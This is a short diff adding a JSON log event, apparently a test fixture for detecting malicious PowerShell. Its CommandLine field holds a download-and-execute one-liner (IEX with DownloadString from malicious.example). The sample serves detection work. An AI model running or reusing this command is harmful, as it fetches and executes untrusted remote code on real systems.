@@ -1,0 +1,10 @@
+{
+  "EventID": 1,
+  "TimeGenerated": "2025-10-23T11:00:00Z",
+  "Computer": "PROD-SERVER-01",
+  "User": "svc_account",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ParentImage": "C:\\Windows\\System32\\services.exe",
+  "CommandLine": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')\"",
+  "Notes": "Trigger: PowerShell IEX + downloaded payload"
+}
